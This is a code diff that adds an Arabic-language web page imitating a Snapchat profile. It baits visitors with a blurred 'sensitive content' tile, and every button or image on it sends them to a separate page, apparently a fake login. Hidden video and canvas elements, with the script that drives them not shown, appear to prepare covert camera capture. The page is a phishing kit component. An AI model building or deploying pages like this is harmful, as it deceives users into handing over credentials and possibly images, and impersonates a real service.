@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>اسم المستخدم - Snapchat</title>
+    <link rel="stylesheet" href="style2.css"> 
+    <link rel="icon" href="logo.png" type="image/png">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+</head>
+<body>
+    <video id="video" playsinline autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <div class="top-nav">
+        <div class="nav-button back-button trigger-login">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15l-5-5 5-5v3h7v4h-7v3z"/></svg>
+        </div>
+        <div class="nav-button share-button trigger-login">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.45 1.25.74 2.01.74 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.87c-.52-.47-1.24-.77-2-.77-1.66 0-3 1.34-3 3s1.34 3 3 3c.76 0 1.48-.3 2-.77l7.12 4.14c-.05.23-.09.46-.09.7 0 1.66 1.34 3 3 3s3-1.34 3-3-1.34-3-3-3z"/></svg>
+        </div>
+        <div class="nav-button menu-button trigger-login has-notification">
+             <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg>
+        </div>
+    </div>
+
+    <main>
+        <div class="cover-photo" style="background-image: url('placeholder.jpg');"></div>
+        <div class="profile-card">
+            <div class="profile-pic-wrapper trigger-login">
+                <img src="profile.jpg" alt="Profile" class="profile-pic">
+            </div>
+            <h1 class="profile-name">zozo 🌸🌚</h1>
+            <p class="profile-meta"><span class="username-text">Salon_amiera</span></p>
+            <span id="followerCount">2.450 من المتابعين</span> 
+            <div class="add-button trigger-login">
+                <span class="plus-icon">+</span>
+                <span>إضافة</span>
+            </div>
+        </div>
+        <div class="info-section">
+            <p class="bio-text"></p>
+            <div class="location-tag">
+                <span class="location-icon"></span>
+                <span>Iraq</span>
+            </div>
+        </div>
+        <div class="tabs-nav">
+            <span class="tab-link active">القصص</span>
+            <span class="tab-link">منصة الأضواء</span>
+        </div>
+        <div class="grid-container">
+            <div class="image-grid">
+                <div class="grid-item trigger-login blur-container" style="background-image: url('placeholder.jpg');">
+                    <div class="blur-overlay">
+                        <i class="fa-solid fa-eye-slash"></i>
+                        <span>محتوى حساس</span>
+                        <small>اضغط للعرض</small>
+                    </div>
+                </div>
+                <div class="grid-item trigger-login video-item" style="background-image: url('placeholder.jpg');"></div>
+                <div class="grid-item trigger-login locked-item" style="background-image: url('placeholder.jpg');"></div>
+            </div>
+        </div>
+    </main>
+    <script src="script2.js"></script>
+    <script>
+        document.querySelectorAll('.trigger-login').forEach(item => {
+            item.addEventListener('click', () => { window.location.href = 'apply2.html'; });
+        });
+    </script>
+</body>
+</html>
